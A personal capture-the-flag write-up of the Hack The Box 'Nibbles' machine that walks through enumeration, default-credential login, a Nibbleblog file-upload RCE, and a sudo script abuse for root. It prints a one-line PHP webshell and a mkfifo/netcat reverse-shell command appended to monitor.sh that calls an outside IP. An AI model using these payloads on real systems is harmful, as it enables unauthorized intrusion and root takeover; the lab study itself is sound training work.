# :trident: [Nibbles] — [Easy]

## :aerial_tramway: Attack Path Summary
- Foothold obtained hidden directory exposed in source code
- Privilege escalation obtained via reverse shell gained through public exploit  
- Root via file permissions misconfiguration on monitor.sh  

## :dart: Objective
Nibble is an easy machine that is a bit shorter than most of the other challenges on HtB. We start with a web server showing only a default blog page and no information. The objective of this challenge is to identify a viable entry point into the machine, obtain access as the standard user, and ultimately escalate privileges to root.

## :bulb: Key Concepts / What You’ll Learn
- Enumeration tactics
	- Initial TCP scan to identify open ports
	- Perform full service & version detection
	- Enumerate web technologies through headers & tooling
	- File enumeration using ffuf 
- Vulnerability Type
	- RCE (Remote Code Execution) via publicly available exploit
- Privilege Escalation Strategy
	- Abuse file permissions misconfiguration by injecting reverse shell into shell script  
- Tools Used (New & Familiar)  
	- Github
	- Exploit-DB
	- nmap
	- ffuf

## :gear: Initial Foothold
As always, start with a simple nmap scan to see what we are up against here:

![screnshot of nmap](/Assets/HtB/Nibbles/nmap.png)

Alright, so we are running two ports: port 22 (SSH) and port 80 (web server). It looks like the web server is a Linux box running an Apache web server. Navigating to port 80 in the browser shows a simple page. This is likely for testing the server's functionality, a simple PoC to demonstrate the server is alive. 

![screenshot of hello world](/Assets/HtB/Nibbles/web_server_hello_world.png)

There is no robots.txt file accessible, unfortunately. Running ffuf also doesn't return much for us at this point. However, I did just remember a basic step I overlooked altogether: review the source code.

![screenshot of source code](/Assets/HtB/Nibbles/source_code.png)

Finally, some movement. Let's check out this directory and see if it holds anything:

![screenshot of blog page](/Assets/HtB/Nibbles/nibbleblog.png)

So now we have a blog page, but there isn't a lot to be seen here. I navigated around the site for a bit, trying to enumerate users, directories, files, links, or anything of interest but I wasn't able to discover much here. Since we now have a new directory, though, let's try to run ffuf again and see if anything is returned:

![screenshot of ffuf output](/Assets/HtB/Nibbles/ffuf_readme.png)

Check the README file to get some information on what technology we are running here:

![screenshot of README](/Assets/HtB/Nibbles/curl_readme.png)

So we are running "nibbleblog", which appears to be an open source CMS. A quick Google search confirms as much with a link to a Github repo. After a bit of searching, I was able to locate CVE-2015-6967, a remote code execution available against Nibbleblog. Unfortunately, we need a valid username/password combination in order to exploit. If you review the ffuf output once more, you'll notice (if you haven't already) there is an admin.php path listed. Check it out:

![screenshot of nibbleblog admin login](/Assets/HtB/Nibbles/nibble_admin.png)

To preface this, we don't always get this lucky but maybe today is the day to buy that lottery ticket:

![screenshot of Google results of default creds](/Assets/HtB/Nibbles/nibbles_default_creds.png)


## :gear: User Privilege Escalation
So once we login, it feels like hitting paydirt. We now have an option for new posts, which includes an option to upload files. At this point, I realized the PoC I downloaded from Github has some syntactical issues that, frankly, I don't want to fix if its not required. So I looked online again and found a different, working PoC to attempt the exploit. This exploit is included in Metasploit, but I would prefer to do this manually to fully understand the chain. However, I'm still going to use the reference included by Metasploit. There are multiple ways to come across this information, but I leveraged Exploit-DB:

![screenshot of Exploit-DB](/Assets/HtB/Nibbles/exploit_db_rce.png)

https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html

The instructions are included on the page and included below for clarity; the vulnerable code is on the referenced page:

- Obtain Admin credentials (for example via Phishing via XSS which can be gained via CSRF, see advisory about CSRF in NibbleBlog 4.0.3)
- Activate My image plugin by visiting http://localhost/nibbleblog/admin.php?controller=plugins&action=install&plugin=my_image
- Upload PHP shell, ignore warnings
- Visit http://localhost/nibbleblog/content/private/plugins/my_image/image.php. This is the default name of images uploaded via the plugin

What we need to do is upload a simple webshell that will allow us to run system commands via the browser. To do this, create a simple php file containing the below and call it cmd.php (for simplicity):

	<?php system($_REQUEST['cmd']); ?>

Now go to http://nibbles.htb/nibbleblog/content/private/plugins/my_image/image.php?cmd=whoami, and you will see the current webuser account name:

![screenshot of whoami on webshell](/Assets/HtB/Nibbles/nibbles_whoami.png)

Enumerating further is going to be tricky if we are in a webshell, so I'm going to bail on this and get a proper reverse shell. The easiest one for my use is with PentestMonkey (https://pentestmonkey.net/tools/web-shells/php-reverse-shell); just be sure you change your variables before uploading the script. Follow the same procedure as before, but set up a netcat listener to receive the incoming connection:

	nc -nlvp 1234 [change this to match the port specified in the reverse shell]

Go back to .../image.php and wait for the connection back to your listener. Now we have full user access, so we can start serious enumeration of the system from here. But first, grab user.txt and submit it since we're able to do that now. 

## :gear: Root Privilege Escalation
Checking running processes, I'm not seeing anything of immediate interest. I do recall that this is an Apache server, so I'm going to try to check the configuration files to see if I can find anything of use.

![screenshot of /etc/apache2/conf file](/Assets/HtB/Nibbles/apache_conf.png)

At this point, I realized I didnt enumerate the simplest things:

	sudo -l

This is quite interesting. There is one thing we can run as sudo, but I have no clue what that is. Navigating back to the /home directory for nibbler, there are only a couple of files. The one of interest now is personal.zip. We'll have to unpack it to view the contents:

	unzip personal.zip
	ls personal/stuff/monitor.sh

![unzipping personal.zip](/Assets/HtB/Nibbles/unzipping_personal_zip.png)
![monitor.sh output](/Assets/HtB/Nibbles/monitor_sh.png)

I'm learning as I go here, but it looks like we need to install "monitor" by way of this script. At that point, we can run the "monitor" command as root. I'm guessing we can combine commands with monitor or otherwise abuse our privileges, but I'm going to have to work with this and see what happens.

	./monitor.sh

This is wrong, though I was close. This script is world-writeable, so we really need to inject a second reverse shell command into this file, then run it under our sudo permissions. By setting up a second listener on a different port, we can retrieve the connection and gain root access.

	echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.169 8083 > /tmp/f" >> monitor.sh
	nc -nlvp 8083

* rm /tmp/f -> remove /tmp/f file if exists
* mkfifo /tmp/f -> create /tmp/f file if not exists
* cat /tmp/f -> read file for safety
* | pipe command to next command
* /bin/sh -i -> interactive shell
* nc {IP ADDRESS} {PORT} -> where to send connection
* > /tmp/f -> put into this file via echo
* >> monitor.sh -> put this entire line at the end of monitor.sh

Now run the command with sudo and you will get the reverse shell connection.
You have to run the full path as sudo to gain elevated permissions

	sudo /home/nibbler/personal/stuff/monitor.sh

![running command](/Assets/HtB/Nibbles/running_command.png)
![root access](/Assets/HtB/Nibbles/root_access.png)

Grab root.txt and complete the challenge.

## :brain: Understanding the Technique
This was an easy but interesting challenge. This is a case where security by obscurity is not efficient. With some simple enumeration we were able to gain access to a hidden, but not locked, directory. By viewing the unprotected README file on the server, we were able to determine the software type and version on the server. From here, we could leverage a publicly available exploit to gain a webshell; we then pivoted this to a full remote shell under our command. In this case, the web server was running as an established user instead of a webuser account, so we already achieved moderate elevation upon initial compromise. This user was allowed to run one seeminly innocuous program to monitor the health of the server. Unfortunately, this file was not properly secured and we were allowed to further edit the file and input another reverse shell. Since this script is able to be run as root by the user, executing the script also executed our remote shell request, sending a request that was received by our listener and granting full root access to the server. 

## :writing_hand: Final Thoughts
This is number 2 out of, say, a million boxes I plan to complete. Yes, that's a bit hyperbolic, but I am lacking severely in my offensive testing and that bothers me. So if you bear with me, I can guarantee you'll start seeing some improvement both in my writing style and my actual skills. Here's to hoping I can provide some benefit to the industry I love so much and that has already made so many of my dreams come true.

## :recycle: Notes
Completed: 2025-11-24  
Machine: https://app.hackthebox.com/machines/[ID]

This is another early box in a long series of learning experiences on HtB, and as such I am leaning heavily on the shoulders of giants in this industry. For this walkthrough, I had to reference IppSec quite a bit to gain full understanding of attack methods and how to abuse the underlying technologies. As this series goes forward my hope is to stand on my own two feet and, with a little bit of luck, maybe stand with these giants one day. Until that day comes, I believe in giving credit where it is due:

[Link to IppSec Walkthrough Video](https://youtu.be/eXTQ3z7esjQ?si=F3ggzZzajyPZQNwo)

[Link to 0xdf walkthrough](https://0xdf.gitlab.io/2018/06/30/htb-nibbles.html)
